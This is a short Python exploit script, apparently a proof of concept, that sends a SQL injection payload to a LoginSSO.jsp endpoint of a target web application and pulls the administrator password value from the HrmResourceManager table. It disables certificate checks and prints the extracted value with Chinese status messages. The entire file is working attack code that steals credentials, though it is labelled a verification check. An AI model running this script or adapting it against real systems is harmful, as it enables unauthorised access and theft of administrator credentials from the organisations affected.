#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import sys
import time
import json
import re

urllib3.disable_warnings()

def verify(site):
    burp0_url = site + "/upgrade/detail.jsp/login/LoginSSO.jsp?id=1%20UNION%20SELECT%20password%20as%20id%20from%20HrmResourceManager"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36"}
    r = requests.get(burp0_url, headers=burp0_headers, verify=False)
    body = r.text.replace("\n", "").replace("\r", "")
    info = re.findall("<code>([^<]+)</code>", body)
    if len(info) != 0:
        return info[0]
    return ""

if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，执行payload: SELECT password as id from HrmResourceManager 结果为：", info)
    else:
        print("[-]漏洞不存在")
